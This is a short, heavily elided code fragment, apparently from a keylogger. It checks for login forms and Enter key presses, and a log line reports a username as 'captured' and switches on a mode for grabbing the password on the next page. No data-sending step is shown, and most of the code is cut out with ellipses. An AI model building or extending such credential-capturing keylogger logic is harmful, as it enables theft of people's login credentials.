                ...
                try
                {
                    ...
                    if (isLoginForm)
                    {
                        ...
                        if (vkCode == VK_RETURN)
                        {
                            ...
                            {
                                // User entered username and pressed Enter, likely going to password page
                                Log("[MULTI-PAGE LOGIN] Username captured, enabling multi-page mode for password page");
